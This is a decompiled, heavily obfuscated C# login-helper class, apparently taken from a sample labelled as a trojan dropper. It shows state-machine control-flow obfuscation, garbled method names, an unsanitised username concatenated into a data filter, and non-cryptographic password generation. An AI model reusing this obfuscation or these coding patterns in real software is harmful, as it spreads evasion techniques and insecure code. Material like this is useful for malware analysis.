// Decompiled with JetBrains decompiler
// Type: AltiumManager.loginClass
// Assembly: NtRFufHofqVzZAe, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 66A3465D-1BFC-53F3-99D7-B93CF53E7ECD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Dropper.MSIL.Dapato.gen-3a2a9cfdbd61a0059dfc842bf5333d9548d205d7c6313ef12be7840df044fc87.exe

using AltiumManager.AltiumDatabaseDataSetTableAdapters;
using AltiumManager.My.Resources;
using Microsoft.VisualBasic;
using System;
using System.Data;
using System.Text;

namespace AltiumManager
{
  public class loginClass
  {
    private string pUserName;
    private string pUserPass;

    public string userName
    {
      get
      {
label_5:
        int num1 = 5;
        int num2 = -5;
        string pUserName;
        while (true)
        {
          switch ((num2 ^ 148) + 148)
          {
            case 0:
              RuntimeMethodHandle runtimeMethodHandle1 = __methodref (loginClass.checkData);
              num2 = -8;
              continue;
            case 1:
              goto label_5;
            case 2:
              switch (num1)
              {
                case 145:
                  pUserName = this.pUserName;
                  num1 = 7;
                  goto label_1;
                case 146:
                  RuntimeMethodHandle runtimeMethodHandle2 = __methodref (loginClass.set_userName);
                  num1 = 6;
                  goto label_1;
                case 147:
                case 148:
                  goto label_10;
                default:
                  num2 = activeUserClass.\uF1D5\uEE64\uE6F5\uEB6E\uE1AF\uE5A2\uE8F9\uE32F\uF6EE\uF409\uEECB\uEE92(92);
                  continue;
              }
            case 3:
label_1:
              num1 ^= 148;
              break;
          }
          num2 = activeUserClass.\uF1D5\uEE64\uE6F5\uEB6E\uE1AF\uE5A2\uE8F9\uE32F\uF6EE\uF409\uEECB\uEE92(87);
        }
label_10:
        return pUserName;
      }
      set => this.pUserName = value;
    }

    public string userPass
    {
      get
      {
label_6:
        int num1 = 9;
        int num2 = -13;
        string pUserPass;
        while (true)
        {
          switch ((num2 ^ 152) + 152)
          {
            case 0:
              switch (num1)
              {
                case 153:
                  RuntimeMethodHandle runtimeMethodHandle1 = __methodref (loginClass.set_userPass);
                  num1 = 10;
                  goto label_1;
                case 154:
                  pUserPass = this.pUserPass;
                  num1 = 8;
                  goto label_1;
                case 155:
                case 156:
                  goto label_10;
                default:
                  num2 = -15;
                  continue;
              }
            case 1:
              goto label_6;
            case 2:
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (loginClass.get_userName);
              num2 = activeUserClass.\uF1D5\uEE64\uE6F5\uEB6E\uE1AF\uE5A2\uE8F9\uE32F\uF6EE\uF409\uEECB\uEE93(93);
              continue;
            case 3:
label_1:
              num1 ^= 147;
              break;
          }
          num2 = activeUserClass.\uF1D5\uEE64\uE6F5\uEB6E\uE1AF\uE5A2\uE8F9\uE32F\uF6EE\uF409\uEECB\uEE92(82);
        }
label_10:
        return pUserPass;
      }
      set => this.pUserPass = value;
    }

    public bool checkData()
    {
      if ((!(Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.pUserName, "", false) == 0 | Microsoft.VisualBasic.CompilerServices.Operators.CompareString(this.pUserPass, "", false) == 0) ? 1 : 0) == 0)
      {
        int num = (int) Interaction.MsgBox((object) "Data is missing");
        goto label_8;
      }
      else
        goto label_10;
label_2:
      int num1;
      num1 ^= 155;
      goto label_4;
label_3:
      int num2;
      while (true)
      {
        switch (num2 ^ 150)
        {
          case 148:
            switch (num1)
            {
              case 144:
                goto label_9;
              case 145:
                goto label_10;
              case 146:
                goto label_11;
              case 147:
                goto label_12;
              case 148:
                goto label_13;
              case 149:
                goto label_15;
              case 150:
                goto label_17;
              default:
                num2 = 0;
                continue;
            }
          case 149:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (loginClass.\u002Ector);
            num2 = 3;
            continue;
          case 150:
            goto label_8;
          case 151:
            goto label_2;
          default:
            goto label_4;
        }
      }
label_9:
      bool flag = false;
      num1 = 15;
      goto label_2;
label_11:
      // ISSUE: method reference
      RuntimeMethodHandle runtimeMethodHandle2 = __methodref (loginClass.checkData);
      num1 = 9;
      goto label_2;
label_12:
      flag = true;
      num1 = 14;
      goto label_2;
label_13:
      if (flag)
      {
        num1 = 10;
        goto label_2;
      }
      else
        goto label_17;
label_15:
      if (!flag)
      {
        num1 = 13;
        goto label_2;
      }
label_17:
      return flag;
label_4:
      num2 = 2;
      goto label_3;
label_8:
      num1 = 11;
      num2 = 1;
      goto label_3;
label_10:
      num1 = 8;
      goto label_2;
    }

    public bool userAvailable(
      AltiumDatabaseDataSet.UsersDataTable tempData,
      UsersTableAdapter tempAdapter)
    {
label_5:
      // ISSUE: reference to a compiler-generated method
      int num1 = Platinium.\uE914\uE4B6\uE066\uEBD1\uE75B\uE04D\uE6A3\uF28F\uF124\uF18E\uEEEF\uE130(132);
      int num2 = 2;
      while (true)
      {
        switch (num2 ^ 147)
        {
          case 142:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (loginClass.checkData);
            num2 = 29;
            continue;
          case 143:
            goto label_5;
          case 144:
            DataRow[] dataRowArray;
            bool flag;
            switch (num1 + 144)
            {
              case 0:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (loginClass.checkData);
                num1 = -21;
                goto label_1;
              case 1:
                flag = dataRowArray.Length == 0;
                num1 = -23;
                goto label_1;
              case 2:
                if (flag)
                {
                  num1 = -18;
                  goto label_1;
                }
                else
                  goto label_15;
              case 3:
                dataRowArray = tempData.Select("Username = '" + this.pUserName + "'");
                num1 = -22;
                goto label_1;
              case 4:
                tempAdapter.Fill(tempData);
                num1 = -24;
                goto label_1;
              case 5:
                goto label_14;
              default:
                num2 = 28;
                continue;
            }
          case 145:
label_1:
            num1 ^= 155;
            break;
        }
        num2 = 3;
      }
label_14:
      int num3 = 0;
      goto label_16;
label_15:
      num3 = 1;
label_16:
      bool flag1;
      if (num3 == 0)
      {
        flag1 = true;
        if (flag1)
          goto label_19;
      }
      flag1 = false;
      if (!flag1)
        ;
label_19:
      return flag1;
    }

    public string randomPass()
    {
label_2:
      int num1 = 15;
      Random random;
      string str1;
      StringBuilder stringBuilder;
      while (true)
      {
        switch (num1 ^ 151)
        {
          case 151:
            random = new Random();
            num1 = 13;
            continue;
          case 152:
            str1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            num1 = 0;
            continue;
          case 153:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (loginClass.set_userPass);
            num1 = 14;
            continue;
          case 154:
            stringBuilder = new StringBuilder();
            num1 = 12;
            continue;
          case 155:
            goto label_7;
          default:
            goto label_2;
        }
      }
label_7:
      int num2 = 1;
label_8:
      short startIndex = checked ((short) random.Next(0, str1.Length));
label_10:
      int num3 = activeUserClass.\uF1D5\uEE64\uE6F5\uEB6E\uE1AF\uE5A2\uE8F9\uE32F\uF6EE\uF409\uEECB\uEE92(87);
      string str2;
      while (true)
      {
        switch ((num3 ^ 148) + 150)
        {
          case 0:
            checked { ++num2; }
            num3 = -8;
            continue;
          case 1:
          case 6:
            goto label_17;
          case 2:
            if (num2 > 12)
            {
              num3 = -5;
              continue;
            }
            goto label_8;
          case 3:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (loginClass.\u002Ector);
            num3 = activeUserClass.\uF1D5\uEE64\uE6F5\uEB6E\uE1AF\uE5A2\uE8F9\uE32F\uF6EE\uF409\uEECB\uEE92(92);
            continue;
          case 4:
            stringBuilder.Append(str1.Substring((int) startIndex, 1));
            num3 = -2;
            continue;
          case 5:
            str2 = stringBuilder.ToString();
            num3 = -1;
            continue;
          default:
            goto label_10;
        }
      }
label_17:
      return str2;
    }
  }
}
